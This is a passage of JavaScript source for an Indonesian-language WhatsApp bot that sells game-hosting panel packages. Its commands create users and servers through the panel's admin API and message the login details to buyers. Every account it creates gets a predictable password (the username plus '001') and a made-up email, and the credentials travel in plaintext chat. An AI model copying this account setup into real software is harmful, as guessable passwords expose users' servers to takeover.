
	

    await Biiofc.sendMessage(m.chat, listMessage)

    await Biiofc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
             case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
        case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY BiiStoree ⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}
minSaldo(sender, 2000, db_saldo)
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 4000, db_saldo)
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 6000, db_saldo)
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 8000, db_saldo)
break
case "srvpaket5": {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/838a085cfb3348892e76d.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 10000, db_saldo)
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 12000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 12000, db_saldo)
break
case "1gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY BiiStoree ⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs YanzzModz
`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
